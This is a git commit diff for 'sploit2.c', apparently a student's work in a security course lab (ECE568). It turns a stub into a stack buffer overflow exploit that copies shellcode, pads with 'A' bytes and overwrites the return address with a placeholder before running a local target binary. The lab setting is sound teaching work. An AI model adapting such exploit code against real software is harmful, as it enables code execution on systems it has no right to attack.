1d449347060d8b673f4efb6ad86b0f3471aeacb5
FrankQQQQ <18518553618@163.com>
2023-10-08 21:35:32 -0400

    update

--- sploits/sploit2.c
+++ sploits/sploit2.c
@@ -6,20 +6,34 @@
 
 #define TARGET "../targets/target2"
 
-int
-main ( int argc, char * argv[] )
-{
-	char *	args[3];
-	char *	env[1];
+int main(int argc, char *argv[]) {
+    char *args[3];
+    char *env[1];
+    char exploit[300]; // buffer to hold exploit string
 
-	args[0] = TARGET;
-	args[1] = "hi ece568";
-	args[2] = NULL;
+    int shellcode_len = sizeof(shellcode);
+    int padding_size = 256 - shellcode_len + 8; // +8 for the saved base pointer
+    unsigned long shell_addr = 0xdeadbeefdeadbeef; // this is a placeholder!
 
-	env[0] = NULL;
+    // copy the shellcode to the start of the exploit string
+    memcpy(exploit, shellcode, shellcode_len);
 
-	if ( execve (TARGET, args, env) < 0 )
-		fprintf (stderr, "execve failed.\n");
+    // add padding
+    memset(exploit + shellcode_len, 'A', padding_size);
 
-	return (0);
+    // overwrite the return address
+    for (int i = 0; i < 8; i++) {
+        exploit[shellcode_len + padding_size + i] = (shell_addr >> (i * 8)) & 0xFF;
+    }
+
+    args[0] = TARGET;
+    args[1] = exploit;
+    args[2] = NULL;
+
+    env[0] = NULL;
+
+    if (execve(TARGET, args, env) < 0)
+        fprintf(stderr, "execve failed.\n");
+
+    return (0);
 }
